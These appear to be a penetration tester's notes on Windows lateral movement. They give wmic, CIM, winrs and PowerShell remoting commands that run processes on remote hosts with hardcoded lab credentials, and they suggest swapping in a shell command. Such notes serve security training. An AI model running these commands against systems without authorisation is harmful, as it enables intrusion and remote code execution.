# WMI 

cmd

```
wmic /node:<ip> /user:jen /password:Password123! process cal create "calc"
```

Powershell

```
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

change $command to a shell command

# WinRM

cmd

```
winrs -r:files04 -u:jen -p:Password123!  "cmd /c hostname & whoami"
```

Powershell

```
$username = 'jen';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Enter-PSSession 1
```